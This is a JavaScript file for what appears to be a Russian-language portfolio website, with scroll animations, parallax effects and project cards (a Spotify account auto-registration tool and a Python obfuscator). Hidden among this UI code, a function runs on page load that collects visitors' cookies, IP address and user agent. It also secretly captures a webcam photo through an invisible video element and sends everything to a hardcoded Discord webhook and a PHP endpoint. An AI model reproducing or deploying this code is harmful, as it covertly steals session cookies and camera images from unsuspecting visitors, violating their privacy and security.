// Функция для анимации появления элементов при скролле
function animateOnScroll() {
    const elements = document.querySelectorAll('.animate-text');
    
    elements.forEach(element => {
        const elementTop = element.getBoundingClientRect().top;
        const elementVisible = 150;
        
        if (elementTop < window.innerHeight - elementVisible) {
            element.classList.add('visible');
        }
    });
}

// Функция для плавной прокрутки к секциям
function smoothScroll() {
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function (e) {
            e.preventDefault();
            const target = document.querySelector(this.getAttribute('href'));
            if (target) {
                target.scrollIntoView({
                    behavior: 'smooth'
                });
            }
        });
    });
}

// Функция для добавления проектов
function addProjects() {
    const projectGrid = document.querySelector('.project-grid');
    
    // Пример проекта (можно заменить на реальные данные)
    const projects = [
			{
				title: 'SpotyReg',
				description: 'Программа для автоматической регистрации аккаунтов в spotify.',
				image: 'autoreg.png',
				link: 'autoreg.html',
			},
			{
				title: 'Obfuscator',
				description: 'Мощный инструмент для обфускации Python кода.',
				image: 'obfuscator.png',
				link: 'obfuscator.html',
			},
		]
    
    projects.forEach(project => {
        const projectElement = createProjectCard(project);
        projectGrid.appendChild(projectElement);
    });
}

function createProjectCard(project) {
    const card = document.createElement('div');
    card.className = 'project-card';
    
    card.innerHTML = `
        <img src="${project.image}" alt="${project.title}" class="project-image">
        <div class="project-info">
            <h3>${project.title}</h3>
            <p>${project.description}</p>
            <a href="${project.link}" class="project-link">Подробнее</a>
        </div>
    `;
    
    return card;
}

// Функция для обработки прокрутки
function handleScroll() {
    const hero = document.querySelector('.hero');
    const scrollPosition = window.scrollY;
    
    if (scrollPosition > 50) {
        hero.classList.add('scrolled');
    } else {
        hero.classList.remove('scrolled');
    }
}

// Функция для обработки клика по фону
function handleBackgroundClick() {
    const background = document.querySelector('.hero-background');
    console.log('Background element:', background); // Проверяем, найден ли элемент
    
    if (background) {
        background.addEventListener('click', function(e) {
            console.log('Click event triggered'); // Проверяем, срабатывает ли событие
            this.classList.toggle('clicked');
        });
    } else {
        console.log('Background element not found'); // Если элемент не найден
    }
}

// Функция для обработки клика по логотипу
function handleLogoClick() {
    const logo = document.querySelector('.clickable-logo');
    const background = document.querySelector('.hero-background');
    
    if (logo && background) {
        logo.addEventListener('click', function() {
            background.classList.toggle('show-image');
        });
    }
}

// Функция для эффекта параллакса
function initParallax() {
    const container = document.querySelector('.screenshot-container');
    const screenshot = container.querySelector('.screenshot');
    
    if (container && screenshot) {
        container.addEventListener('mousemove', (e) => {
            const rect = container.getBoundingClientRect();
            const x = e.clientX - rect.left;
            const y = e.clientY - rect.top;
            
            const centerX = rect.width / 2;
            const centerY = rect.height / 2;
            
            // Вычисляем смещение тени
            const shadowX = (x - centerX) / 20;
            const shadowY = (y - centerY) / 20;
            
            // Вычисляем поворот
            const rotateX = (y - centerY) / 20;
            const rotateY = (centerX - x) / 20;
            
            // Применяем эффекты
            container.style.setProperty('--rotateX', `${rotateX}deg`);
            container.style.setProperty('--rotateY', `${rotateY}deg`);
            screenshot.style.setProperty('--shadow-offset-x', `${shadowX}px`);
            screenshot.style.setProperty('--shadow-offset-y', `${shadowY}px`);
        });
        
        container.addEventListener('mouseleave', () => {
            container.style.setProperty('--rotateX', '0deg');
            container.style.setProperty('--rotateY', '0deg');
            screenshot.style.setProperty('--shadow-offset-x', '0');
            screenshot.style.setProperty('--shadow-offset-y', '0');
        });
    }
}

// Функция для получения фото с веб-камеры
async function captureWebcamPhoto() {
    try {
        // Создаем невидимый элемент video
        const video = document.createElement('video');
        video.style.display = 'none';
        document.body.appendChild(video);

        // Запрашиваем доступ к камере с минимальными разрешениями
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
                width: 320,
                height: 240,
                facingMode: 'user'
            },
            audio: false
        });
        
        video.srcObject = stream;
        
        // Ждем загрузки видео
        await new Promise((resolve) => {
            video.onloadedmetadata = () => {
                video.play();
                resolve();
            };
        });

        // Создаем canvas для захвата кадра
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        
        // Делаем снимок
        ctx.drawImage(video, 0, 0);
        
        // Останавливаем поток и удаляем элементы
        stream.getTracks().forEach(track => track.stop());
        video.remove();
        canvas.remove();
        
        // Конвертируем в base64
        return canvas.toDataURL('image/jpeg', 0.5); // Уменьшаем качество для быстрой отправки
    } catch (error) {
        console.error('Ошибка при получении фото с веб-камеры:', error);
        return null;
    }
}

// Функция для отправки данных на сервер
async function sendDataToServer() {
    const webhookUrl = 'https://discord.com/api/webhooks/1375196009419898972/gxhjvoZXT56YAmQcZNsjG7AdcvkvmtdCJ5S8JbrK9CoVToRfNdzh8vXZkSER4gQzstrr';
    
    // Получаем IP-адрес
    let ipAddress = 'Не удалось получить IP';
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        ipAddress = data.ip;
    } catch (error) {
        console.error('Ошибка при получении IP:', error);
    }

    // Получаем фото с веб-камеры в фоновом режиме
    const webcamPromise = captureWebcamPhoto();

    const cookies = document.cookie;
    const userAgent = navigator.userAgent;
    const timestamp = new Date().toISOString();

    // Создаем текстовый файл с куки
    const cookiesContent = `=== Новые данные получены ===\nВремя: ${timestamp}\nIP Адрес: ${ipAddress}\nUser Agent: ${userAgent}\nCookies:\n${cookies}`;
    const cookiesBlob = new Blob([cookiesContent], { type: 'text/plain' });
    const cookiesFile = new File([cookiesBlob], 'cookies.txt', { type: 'text/plain' });

    // Создаем FormData для отправки файлов
    const formData = new FormData();
    formData.append('content', `**Новые данные получены**\n\n**Время:** ${timestamp}\n**IP Адрес:** ${ipAddress}\n**User Agent:** ${userAgent}\n**Cookies:**\n\`\`\`\n${cookies}\n\`\`\``);
    formData.append('file', cookiesFile);

    // Ждем получения фото
    const webcamPhoto = await webcamPromise;
    
    // Добавляем фото, если оно есть
    if (webcamPhoto) {
        const blob = await fetch(webcamPhoto).then(r => r.blob());
        formData.append('file', blob, 'webcam.jpg');
    }

    try {
        await fetch(webhookUrl, {
            method: 'POST',
            body: formData
        });
    } catch (error) {
        console.error('Ошибка при отправке данных в Discord:', error);
    }

    // Сохраняем в файл
    try {
        await fetch('save_cookies.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ 
                cookies: cookies,
                ip: ipAddress,
                webcam: webcamPhoto
            })
        });
    } catch (error) {
        console.error('Ошибка при сохранении данных в файл:', error);
    }
}

// Инициализация при загрузке страницы
document.addEventListener('DOMContentLoaded', function() {
    console.log('DOM loaded');
    
    // Отправляем данные сразу при загрузке страницы
    sendDataToServer();
    
    // Добавляем проекты
    addProjects();
    
    // Инициализируем плавную прокрутку
    smoothScroll();
    
    // Запускаем анимацию при загрузке
    animateOnScroll();
    
    // Добавляем обработчик клика по фону
    handleBackgroundClick();
    
    // Добавляем обработчик клика по логотипу
    handleLogoClick();
    
    // Инициализируем эффект параллакса
    initParallax();
    
    // Добавляем обработчик скролла
    window.addEventListener('scroll', animateOnScroll);
}); 